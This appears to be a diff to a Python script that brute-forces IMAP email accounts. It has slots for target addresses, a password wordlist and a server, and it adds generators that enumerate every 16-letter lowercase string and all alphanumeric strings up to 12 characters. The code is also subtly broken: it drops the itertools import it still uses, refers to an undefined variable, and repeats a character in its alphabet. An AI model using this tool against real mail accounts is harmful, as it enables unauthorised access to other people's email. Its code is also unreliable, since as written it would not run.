@@ -26,15 +26,38 @@
 
 
 
-import imapclient, backports, itertools
+import imapclient, backports
 
 addressList = [] #put the target addresses here in list format e.g ['test1@test.com','test2@test.com']
 wordlist = [] #put your wordlist/dictionary here in list format e.g ['test1','test2']
 imapServer = [] #put your target server here in list format e.g ['imap.test.com']
 
+# Application specific password wordlist generator (for 16 character lowercase brute forcing- not recommended!)
 def create_wordlist():
+    broken_list = []
+    alphabet = 'abcdefghijklmnopqrstuvwxyz'
+    min_length = 16
+    max_length = 16
     for n in range(min_length,max_length+1):
         for word in itertools.product(alphabet, repeat=n):
+            broken_list.append(word)
+
+    for x in broken_list:
+        word = ''
+        for y in range(len(x)):
+            word += ''.join(x[y])
+        wordlist.append(word)
+    return wordlist
+
+# Bruteforce wordlist generator (don't really recommend using this as it is extremely time consuming)
+def create_brute_wordlist():
+    broken_list = []
+    # Put potential characters here (don't duplicate)
+    alphabet = 'abcdefghijklmnopqrstuvwxyzlABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+    min_length = 1
+    max_length = 12
+    for n in range(min_length,max_length+1):
+        for word in itertools.product(characters, repeat=n):
             broken_list.append(word)
 
     for x in broken_list:
@@ -60,5 +83,8 @@ def imapAttack(emails,wl,imapServerName):
                 break
             except Exception:
                 continue
-            
+
+# Remove comments next to commands below to generate wordlists (not recommended-demo purposes only!)
+#create_wordlist()
+#create_brute_wordlist()
 imapAttack(addressList,wordlist,imapServer)
